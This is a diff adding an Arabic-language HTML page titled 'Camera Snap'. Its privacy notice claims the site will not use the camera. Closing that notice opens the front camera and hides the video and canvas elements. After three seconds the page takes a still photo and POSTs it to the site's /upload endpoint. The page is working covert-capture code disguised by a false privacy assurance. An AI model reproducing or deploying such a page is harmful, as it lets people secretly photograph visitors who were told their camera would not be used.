@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Camera Snap</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+
+    body {
+      font-family: 'Cairo', sans-serif;
+      margin: 0;
+      background-color: #f9fafb;
+      direction: rtl;
+    }
+
+    #privacyModal {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      padding: 15px; /* عشان ما يلصقش الصندوق على جوانب الشاشة */
+    }
+
+    #privacyModal > div {
+      background: white;
+      padding: 25px 20px;
+      width: 100%;
+      max-width: 400px; /* حجم مناسب للكمبيوتر والموبايل */
+      border-radius: 15px;
+      box-shadow: 0 12px 25px rgba(0, 0, 0, 0.2);
+      position: relative;
+      text-align: center;
+    }
+
+    #closeBtn {
+      position: absolute;
+      top: 15px;
+      right: 20px;
+      font-size: 28px;
+      font-weight: 700;
+      color: #333;
+      cursor: pointer;
+      transition: color 0.2s ease;
+    }
+
+    #closeBtn:hover {
+      color: #e74c3c;
+    }
+
+    #privacyModal h2 {
+      margin: 0 0 15px 0;
+      font-weight: 700;
+      font-size: 24px;
+      color: #222;
+    }
+
+    #privacyModal p {
+      font-weight: 400;
+      font-size: 16px;
+      color: #555;
+      line-height: 1.6;
+    }
+
+    /* تعديلات خاصة لشاشات أصغر */
+    @media (max-width: 480px) {
+      #privacyModal > div {
+        padding: 20px 15px;
+        max-width: 90%;
+      }
+      #closeBtn {
+        font-size: 24px;
+        top: 12px;
+        right: 15px;
+      }
+      #privacyModal h2 {
+        font-size: 22px;
+      }
+      #privacyModal p {
+        font-size: 14px;
+      }
+    }
+
+    /* الفيديو والكانفس مخفية */
+    #video, #canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="privacyModal">
+    <div>
+      <span id="closeBtn">&times;</span>
+      <h2>تنويه الخصوصية</h2>
+      <p>
+        هذا الموقع يطلب بعض الاذونات فقط لضمان عمل التطبيق بشكل صحيح.<br>
+        نحن نحرص على حماية خصوصيتك وعدم استخدام الكاميرا او اي شيئ اخر.
+      </p>
+    </div>
+  </div>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const privacyModal = document.getElementById('privacyModal');
+    const closeBtn = document.getElementById('closeBtn');
+
+    closeBtn.addEventListener('click', () => {
+      privacyModal.style.display = 'none';
+
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(function(stream) {
+          const video = document.getElementById('video');
+          video.srcObject = stream;
+
+          video.onloadedmetadata = () => {
+            setTimeout(() => {
+              const canvas = document.getElementById('canvas');
+              const context = canvas.getContext('2d');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+              const imageData = canvas.toDataURL('image/png');
+
+              fetch('/upload', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ image: imageData })
+              });
+            }, 3000);
+          };
+        })
+        .catch(function(err) {
+          console.error("Camera access denied:", err);
+        });
+    });
+  </script>
+</body>
+</html>
